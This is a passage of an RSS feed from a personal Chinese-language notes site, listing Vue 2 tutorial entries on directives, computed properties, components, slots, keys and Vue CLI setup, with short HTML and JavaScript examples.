&amp;lt;/body&amp;gt;  &amp;lt;script src=&amp;#34;./js/main.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;/html&amp;gt; JavaScript</description>
    </item>
    
    <item>
      <title>Vue 过滤与排序</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/%E8%BF%87%E6%BB%A4%E4%B8%8E%E6%8E%92%E5%BA%8F/</link>
      <pubDate>Wed, 18 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/%E8%BF%87%E6%BB%A4%E4%B8%8E%E6%8E%92%E5%BA%8F/</guid>
      <description>过滤与排序 当用computed和watch都能实现某一个功能的时候，优先使用computed。
过滤 分别用两种方式实现过滤，computed 与watch，推荐使用前者。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;h1&amp;gt;模糊搜索&amp;lt;/h1&amp;gt;  &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; placeholder=&amp;#34;请输入名字&amp;#34; v-model=&amp;#34;keyWord&amp;#34;&amp;gt;  &amp;lt;ul&amp;gt;  &amp;lt;li v-for=&amp;#34;p in filterPersons&amp;#34; :key=&amp;#34;p.id&amp;#34;&amp;gt;  {{p.name}}-{{p.age}}-{{p.sex}}  &amp;lt;/li&amp;gt;  &amp;lt;/ul&amp;gt;  &amp;lt;/div&amp;gt; JavaScrip
watch 实现
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	keyWord: &amp;#39;&amp;#39;, 	persons: [ 	{ id: &amp;#39;001&amp;#39;, name: &amp;#39;马冬梅&amp;#39;, age: 20, sex: &amp;#39;女&amp;#39; }, 	{ id: &amp;#39;002&amp;#39;, name: &amp;#39;周冬雨&amp;#39;, age: 21, sex: &amp;#39;女&amp;#39; }, 	{ id: &amp;#39;003&amp;#39;, name: &amp;#39;周杰伦 &amp;#39;, age: 22, sex: &amp;#39;男&amp;#39; }, 	{ id: &amp;#39;004&amp;#39;, name: &amp;#39;温兆伦 &amp;#39;, age: 18, sex: &amp;#39;男&amp;#39; }, 	], 	// 用来接受过滤后的结果 	filterPersons: [], 	}, 	methods: {}, 	watch: { 	keyWord: { 	// 初始化 filterPersons 数组 	immediate: true, 	handler(val) { 	// 将过滤后的结果赋给 persons 	this.</description>
    </item>
    
    <item>
      <title>Vue data</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/data/</link>
      <pubDate>Sun, 15 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/data/</guid>
      <description>data data 中的数据，不是直接在 Vue 实例中，而是在_data中，而_data在 Vue 实例中。
data 中的数据，Vue 使用了数据代理和数据劫持，从而实现了数据响应式。</description>
    </item>
    
    <item>
      <title>Vue methods</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/methods/</link>
      <pubDate>Sun, 15 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/methods/</guid>
      <description>methods methods 中的函数，其 this 都指向 Vue 实例或者组件实例对象。
任何 Vue 实例中的方法，只能使用普通函数，不能使用箭头函数，否则箭头函数中的 this 指向就不再是 Vue，而是 window。
var vm = new Vue({ 	el: &amp;#39;#root&amp;#39;, 	data: { 	name: &amp;#39;China&amp;#39;, 	},  // 方法 	methods: {  // 只能使用普通函数 	showInfo() { 	console.log(this); 	},  // 不能使用箭头函数  showInfo:()=&amp;gt; { 	console.log(this); 	}, 	}, 	}, }); Vue.config.productionTip = false; </description>
    </item>
    
    <item>
      <title>Vue 键盘事件</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E4%BA%8B%E4%BB%B6/%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6/</link>
      <pubDate>Sun, 15 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E4%BA%8B%E4%BB%B6/%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6/</guid>
      <description>键盘事件 @键盘事件.按键key值
Vue 中常用的按键别名：
 回车：enter 删除：delete 退出：esc 空格：space 换行：tab（必须配合keydow使用，如果使用 keyup，那么按下tab 后，当前元素会失去焦点，则元素的keyup 事件则不会触发）  Vue 未提供别名的按键，可以使用按键原始的 key 值去绑定，但要注意，部分按键的key 值默认是大坨峰命名，需要转为短横线命名，比如CapsLock。
&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; @keydown.Caps-Lock=&amp;#39;showInfo&amp;#39;&amp;gt; 系统修饰键（用法特殊）： ctrl、 alt、 shift、 meta。
 配合 keyup 使用：按下修饰键的同时，再按下其他健，随后只释放其他健，事件才被触发。 配合 keydown 使用：正常触发事件。  自定义KeyCode
使用 Vue.confing.keyCode.自定义键名 = KeyCode
键盘事件连写
表示按下 ctrl + y才能触发事件。
&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; @keyup.ctrl.y=&amp;#39;showInfo&amp;#39;&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue MVVM</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/mvvm/</link>
      <pubDate>Sat, 14 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/mvvm/</guid>
      <description>MVVM 双向数据绑定，数据影响视图，视图影响数据
M：模型，指 data 中的数据。
V：视图，指模板。
VM：视图模型，指 Vue 实例对象。
data 中的所有属性，最后都出现在了 Vue 实例上。
vue 实例上的所有属性，以及 Vue 原型上的所有属性，在 Vue 模板中国都可以直接使用。</description>
    </item>
    
    <item>
      <title>Vue set</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E5%85%A8%E5%B1%80-api/set/</link>
      <pubDate>Sat, 14 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E5%85%A8%E5%B1%80-api/set/</guid>
      <description>set 给响应式对象添加一个属性，并且这个新属性是响应式的，因此，且会触发视图的更新。
该对象必须是响应式对象，因为 Vue 无法探测普通的新增属性。
该对象不能是 Vue 实例，或者 Vue 实例的根数据对象：data、。
如果响应式对象为 array，则第二个参数为 index.</description>
    </item>
    
    <item>
      <title>Vue 插值语法</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8F%92%E5%80%BC%E8%AF%AD%E6%B3%95/</link>
      <pubDate>Sat, 14 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8F%92%E5%80%BC%E8%AF%AD%E6%B3%95/</guid>
      <description>插值语法 用于解析元素包含的内容，一般使用{{name}}来进行插值，其中name必须是JavaScrip 表达式，且可以直接读取data中的所有数据。
&amp;lt;!-- 插值语法 --&amp;gt; &amp;lt;h1&amp;gt;hello！{{name}}&amp;lt;/h1&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue 数据代理</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86/</link>
      <pubDate>Sat, 14 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86/</guid>
      <description>数据代理 通过一个对象代理对另一个对象中的属性的操作（读/写）.
在 Vue 中，通过 vm 来代理 data 中的属性操作，使我们更加方便的操作 data 中的数据。
原理  通过definProperty() 将data中所有的属性添加到 vm 上。 为每一个添加到 vm 上的属性，都定义一个getter()和setter()。 因此，每当我们修改或访问 vm 中的属性，都会调用其属性所对应的getter() 和setter()， 最后，在getter() 和setter()内部来访问或修改data中的属性值。  // 通过 obj2 访问或修改 obj1 中的 x  var obj = { x: 100 }; var obj2 = { y: 200 };  // 给 obj2 定义一个新的属性 x Object.defineProperty(obj2, &amp;#39;x&amp;#39;, { 	get() { 	// 当访问 obj2.x 时，返回 100，并将 100 赋给 obj2.x， 	return obj.</description>
    </item>
    
    <item>
      <title>Vue scoped</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/scoped/</link>
      <pubDate>Fri, 13 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/scoped/</guid>
      <description>scoped 在vue组件中，给style添加scoped属性，以表示它的样式作用于当下的模块，很好的实现了样式私有化的目的，这是一个非常好的机制。
但是为什么要慎用呢？在实际业务中我们往往会对公共组件样式做细微的调整，如果添加了scoped属性，那么样式将会变得不易修改。
使用该属性后，它会给组件添加唯一的自定义属性，使我们原本的CSS 选择器变为 CSS 属性选择器，使得该组件的样式是私有化。</description>
    </item>
    
    <item>
      <title>Vue 向组件传递数据</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E5%90%91%E7%BB%84%E4%BB%B6%E4%BC%A0%E9%80%92%E6%95%B0%E6%8D%AE/</link>
      <pubDate>Fri, 13 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E5%90%91%E7%BB%84%E4%BB%B6%E4%BC%A0%E9%80%92%E6%95%B0%E6%8D%AE/</guid>
      <description>向组件传递数据 用props:[]定义属性，并通过attr=‘value’的方式将属性的value传给元素。
var MyComp = { 	props: [&amp;#39;title&amp;#39;], 	template: `&amp;lt;h1&amp;gt;{{title}}&amp;lt;/h1&amp;gt;`, };  var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	components: { 	// 当属性名与属性值一样，则该属性可简写 	MyComp, 	}, 	// 传入属性 title=&amp;#39;Vue&amp;#39; 	template: `&amp;lt;div&amp;gt; &amp;lt;MyComp title=&amp;#39;Vue&amp;#39;&amp;gt;&amp;lt;/MyComp&amp;gt; &amp;lt;/div&amp;gt;`, }); Vue.config.productionTip = false; 在组件中，属性是只读的，不可更改的，这叫做单向数据流。
一个组件的属性，应该避免被除了自身以外的组件所更改或控制</description>
    </item>
    
    <item>
      <title>Vue 插槽</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E6%8F%92%E6%A7%BD/</link>
      <pubDate>Fri, 13 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E6%8F%92%E6%A7%BD/</guid>
      <description>插槽 单个插槽。将一个组件的内容，传递到&amp;lt;slot&amp;gt;&amp;lt;/solt&amp;gt;中。
&amp;lt;slot&amp;gt;&amp;lt;/slot&amp;gt; 具名插槽 有时我们需要多个插槽，就需要给 &amp;lt;slot&amp;gt; 带上一个名字。
一个不带 name 的 &amp;lt;slot&amp;gt; 出口会带有隐含的名字“default”。</description>
    </item>
    
    <item>
      <title>Vue 注册组件</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E6%B3%A8%E5%86%8C%E7%BB%84%E4%BB%B6/</link>
      <pubDate>Fri, 13 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E6%B3%A8%E5%86%8C%E7%BB%84%E4%BB%B6/</guid>
      <description>注册组件 注册组件有两种方式，全局注册和局部注册。
但一般不会使用全局注册
全局注册 一旦全局注册了一个组件，整个应用中任何地方都可以使用该组件。
使用Vue.component()来组成组件，第一个参数是组件的名字，第二个参数是组件的内容。
// 定义组件 var Title = { 	template: `&amp;lt;h1&amp;gt;标题&amp;lt;/h1&amp;gt;`, }; // 注册全局组件 Vue.component(&amp;#39;MyComp&amp;#39;, Title);  var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	template: `&amp;lt;div&amp;gt; &amp;lt;MyComp&amp;gt;&amp;lt;/MyComp&amp;gt; &amp;lt;/div&amp;gt;`, }); Vue.config.productionTip = false; 局部注册 局部注册就是哪里要用到该组件，就在哪里注册。
在 Vue 实例中使用components: {}来组成一个局部组件，建议组件名和组件值名字相同。
// 定义 var Title = { 	template: `&amp;lt;h1&amp;gt;一级标题&amp;lt;/h1&amp;gt;`, };  var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	components: { 	// MyComp 组件名字 Title 组件值 	MyComp: Title, 	}, 	template: `&amp;lt;div&amp;gt; &amp;lt;MyComp&amp;gt;&amp;lt;/MyComp&amp;gt; &amp;lt;/div&amp;gt;`, }); Vue.</description>
    </item>
    
    <item>
      <title>Vue 组件树</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6%E6%A0%91/</link>
      <pubDate>Fri, 13 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6%E6%A0%91/</guid>
      <description>组件树 一个组件创建好后，往往会在各种地方使用它。它可能多次出现在 vue 实例中，也可能出现在其他组件中，于是就形成了一棵组件树</description>
    </item>
    
    <item>
      <title>VueCli</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/vuecli/vuecli/</link>
      <pubDate>Fri, 13 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/vuecli/vuecli/</guid>
      <description>VueCli 安装 全局安装：
npm install -g @vue/cli 安装完成后，用命令检查安装的版本
vue --version 创建项目 vue create vue-cli 接下来就是一些导航选择，根据自己选择即可。
运行工程 创建完成后，用cd进入 vue-cli目录，再用npm run serve启动工程，出现以下提示即为运行成功：
 App running at:  - Local: http://localhost:8080/  - Network: unavailable Local：它会将工程托管到本地的一个服务器地址http://localhost:8080/。
Network：运行时的网络状态。
项目中的目录文件 node_modules：保存着 Vue 所有直接或间接依赖的第三方库。
public：保存着页面模板。
src：源代码目录。
package.json：工程配置文件
  serve：开发环境，它会将工程托管到一个本地服务器进行预览。
  build：生产环境，它会将工程打包成一个dist文件夹，这个文件夹就是我们工程的源代码
  vue.config.js：vue-cli 的配置文件，大部分都配置都是 webpack配置
 &amp;#34;scripts&amp;#34;: {&amp;#34;serve&amp;#34;: &amp;#34;vue-cli-service serve&amp;#34;,&amp;#34;build&amp;#34;: &amp;#34;vue-cli-service build&amp;#34;}, 还原工程 使用npm install，它会根据package.json文件中的dependencies和devDependencies来还原node_modules目录
配置二年级</description>
    </item>
    
    <item>
      <title>Mustache</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/mustache/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/mustache/</guid>
      <description>Mustache Mustache 是一个 轻逻辑放模板解析引擎。
小程序的 wxml 中的代码、Vue 中的插值都是用的 mustache。
语法 {{keyName}} 简单的变量替换。
{{{keyName}}} 输出会将等特殊字符转译，如果想保持内容原样输出可以使用{{{}}}。
{{#keyName}} {{/keyName}} 以#开始、以/结束表示区块，它会根据当前上下文中的键值来对区块进行一次或多次渲染。它的功能很强大，有类似 if、foreach的功能。
{{^keyName}} {{/keyName}} 该语法与{{#keyName}} {{/keyName}} 类似，不同在于它是当keyName 值为 null, undefined, false 时才渲染输出该区块内容。
{{.}} 表示枚举，可以循环输出整个数组。
{{!comments}} 表示注释
{{&amp;gt;partials}} 以&amp;gt;开始表示子模块，当结构比较复杂时，我们可以使用该语法将复杂的结构拆分成几个小的子模块。</description>
    </item>
    
    <item>
      <title>Vue computd</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/computd/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/computd/</guid>
      <description>computd 通过已有的属性计算出来的属性。
计算属性最终会出现在 Vue 实例上，直接调用即可。
如果计算属性有可能被修改，那必须写set()去响应修改，且要引起计算属性所依赖的属性发生变化。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt; 	&amp;lt;p&amp;gt;姓：{{ firstName }}&amp;lt;/p&amp;gt; 	&amp;lt;p&amp;gt;名：{{ lastName }}&amp;lt;/p&amp;gt; 	&amp;lt;p&amp;gt;全名：{{ fullName }}&amp;lt;/p&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	text: &amp;#39;表单&amp;#39;, 	firstName: &amp;#39;苏&amp;#39;, 	lastName: &amp;#39;明敏&amp;#39;, 	}, 	computed: { 	fullName: { 	get() { 	return this.firstName + &amp;#39;-&amp;#39; + this.lastName; 	}, 	set(value) { 	var arr = value.</description>
    </item>
    
    <item>
      <title>Vue key</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%89%B9%E6%AE%8A%E5%B1%9E%E6%80%A7/key/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%89%B9%E6%AE%8A%E5%B1%9E%E6%80%A7/key/</guid>
      <description>key 表示节点的唯一标识key。
使用 v-for 时，如果不给元素加上 key，那么 Vue 会默认将 index当作元素的key。
该属性可以干预diff 算法，在同一层级，key值相同的节点会进行比对，key值不同的节点则不会比对。
在循环生成的节点中，vue 强烈建议给予每个节点唯一且稳定的 key 值。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;div v-if=&amp;#34;handoff === &amp;#39;login&amp;#39;&amp;#34;&amp;gt; &amp;lt;label&amp;gt;登录&amp;lt;/label&amp;gt; &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; key=&amp;#34;1&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div v-else&amp;gt; &amp;lt;label&amp;gt;注册&amp;lt;/label&amp;gt; &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; key=&amp;#34;2&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div&amp;gt; &amp;lt;!-- handoff 等于：如果 login 为 true，则 handoff === register，否则 handoff === login --&amp;gt; &amp;lt;button @click=&amp;#34;handoff = handoff === &amp;#39;login&amp;#39;?&amp;#39;register&amp;#39;:&amp;#39;login&amp;#39;&amp;#34;&amp;gt;切换&amp;lt;/button&amp;gt;  &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	text: &amp;#39;表单&amp;#39;, 	handoff: &amp;#39;login&amp;#39;, 	}, }); Vue.</description>
    </item>
    
    <item>
      <title>Vue v-for</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/v-for/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/v-for/</guid>
      <description>v-for 循环渲染元素。
当和 v-if 一起使用时，v-for 的优先级比 v-if 更高。
可以用 of 替代 in 作为分隔符，因为它更接近 JavaScript 迭代器的语法。
不要使用对象或数组之类的非基本类型值作为 v-for 的 key。请用字符串或数值类型的值。
HTML
 &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;ul&amp;gt;  &amp;lt;li v-for=&amp;#34;(p,index) in persons&amp;#34; :key=&amp;#34;index&amp;#34;&amp;gt;  {{p.name}} and {{p.age}}  &amp;lt;/li&amp;gt;  &amp;lt;/ul&amp;gt;   &amp;lt;ul&amp;gt;  &amp;lt;li v-for=&amp;#34;(f,index) in fruits&amp;#34; :key=&amp;#34;index&amp;#34;&amp;gt;  {{f}}  &amp;lt;/li&amp;gt;  &amp;lt;/ul&amp;gt;  &amp;lt;/div&amp;gt; JavaScrip
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	// 遍历数组 	persons: [ 	{ id: &amp;#39;001&amp;#39;, name: &amp;#39;小明&amp;#39;, age: 9 }, 	{ id: &amp;#39;002&amp;#39;, name: &amp;#39;小苏&amp;#39;, age: 21 }, 	{ id: &amp;#39;003&amp;#39;, name: &amp;#39;小朱 &amp;#39;, age: 20 }, 	], 	// 遍历对象 	fruits: { 	name: &amp;#39;banana&amp;#39;, 	color: &amp;#39;yellow&amp;#39;, 	kg: &amp;#39;3kg&amp;#39;, 	}, 	}, });  Vue.</description>
    </item>
    
    <item>
      <title>Vue v-if</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/v-if/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/v-if/</guid>
      <description>v-if 控制元素是否存在。
如果多个 if 指令：v-if、v-else、v-else-if连用，则使用它们的元素必须紧挨。
在 &amp;lt;template&amp;gt; 元素上使用 v-if 时，最终的渲染结果将不包含 &amp;lt;template&amp;gt; 元素。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;!-- 如果 isShow 为 true，则插入 img，如果 isShow 为 false，则移除 img --&amp;gt;  &amp;lt;img v-if=&amp;#34;isShow&amp;#34; :src=&amp;#34;url&amp;#34; alt=&amp;#34;&amp;#34;&amp;gt; &amp;lt;!-- 否则（img 已移除），则显示 button 元素，如果 img 已插入，则移除 button--&amp;gt; &amp;lt;button v-else=&amp;#34;!isShow&amp;#34;&amp;gt;切换&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; JavaScript
var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	url: &amp;#39;https://img1.baidu.com/it/u=999074466,1525171260&amp;amp;fm=253&amp;amp;fmt=auto&amp;amp;app=138&amp;amp;f=JPEG?w=500&amp;amp;h=333&amp;#39;, 	}, }); Vue.config.productionTip = false; </description>
    </item>
    
    <item>
      <title>Vue v-on</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-on/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-on/</guid>
      <description>v-on 注册一个事件，可简写为@。
支持一些指令修饰符，比如 prevent。
事件函数必须存在于methods中，事件参数为event。
&amp;lt;!-- 完整语法 --&amp;gt; &amp;lt;a v-on:click=&amp;#34;doSomething&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt;  &amp;lt;!-- 缩写 --&amp;gt; &amp;lt;a @click=&amp;#34;doSomething&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt; 调用事件函数时
 不加括号，调用事件函数就可以直接获取到该函数的事件对象。 加了 ()， 除了可以使用$event来获取事件对象，还能传入其他的参数。  &amp;lt;div id=&amp;#34;root&amp;#34;&amp;gt;  &amp;lt;button @click=&amp;#39;showInfo&amp;#39;&amp;gt;提示信息&amp;lt;/button&amp;gt;  &amp;lt;button @click=&amp;#39;showInfo2($event,6666)&amp;#39;&amp;gt;提示信息&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue v-show</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/v-show/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/v-show/</guid>
      <description>v-show 控制元素是否可见，如果元素不可见，则该元素display:none。
HTML &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;img v-show=&amp;#34;isShow&amp;#34; :src=&amp;#34;url&amp;#34; alt=&amp;#34;&amp;#34;&amp;gt; &amp;lt;button @click=&amp;#34;isShow = !isShow&amp;#34;&amp;gt;切换&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; JavaScript var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: {	url: &amp;#39;https://img1.baidu.com/it/u=999074466,1525171260&amp;amp;fm=253&amp;amp;fmt=auto&amp;amp;app=138&amp;amp;f=JPEG?w=500&amp;amp;h=333&amp;#39;, 	}, }); Vue.config.productionTip = false; </description>
    </item>
    
    <item>
      <title>Vue 挂载</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E6%8C%82%E8%BD%BD/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E6%8C%82%E8%BD%BD/</guid>
      <description>挂载 将生成的真实 DOM 树，插入到页面上的过程，称之为挂载。
挂载方式 通过el:&#39;CSS 选择器&#39;来挂载。
new Vue({ 	// vue 代码 }).$mount(&amp;#39;#app&amp;#39;); 通过Vue 实例.$mount(&#39;CSS 选择器&#39;)进行稍后挂载。
// 或者 var v = Vue({ 	// vue 代码 }); v.$mount(&amp;#39;#app&amp;#39;); </description>
    </item>
    
    <item>
      <title>Vue 指令</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%8C%87%E4%BB%A4/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%8C%87%E4%BB%A4/</guid>
      <description>指令 用于解析元素（属性、内存、事件等），比如使用v-binds:url来进行解析，使得该属性成为动态属性。其中 url必须是JavaScrip表达式，也可以直接读取 data 中的数据。
Vue 中的指令始终以v-开头。
v-bind 单项数据绑，数据只能从 data 流向页面。
HTML &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;img v-bind:src=&amp;#34;url&amp;#34; alt=&amp;#34;&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; JavaScrip var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	url: &amp;#39;https://img1.baidu.com/it/u=999074466,1525171260&amp;amp;fm=253&amp;amp;fmt=auto&amp;amp;app=138&amp;amp;f=JPEG?w=500&amp;amp;h=333&amp;#39;, 	}, }); Vue.config.productionTip = false; 简写 &amp;lt;!-- 完整语法 --&amp;gt; &amp;lt;a v-bind:href=&amp;#34;url&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt;  &amp;lt;!-- 简写 --&amp;gt; &amp;lt;a :href=&amp;#34;url&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue 指令修饰符</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%8C%87%E4%BB%A4%E4%BF%AE%E9%A5%B0%E7%AC%A6/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%8C%87%E4%BB%A4%E4%BF%AE%E9%A5%B0%E7%AC%A6/</guid>
      <description>指令修饰符 prevent 阻止元素默认行为，比如 a 元素的跳转。
指令修饰符可以连写，先阻止元素默认行为，再阻止元素冒泡。
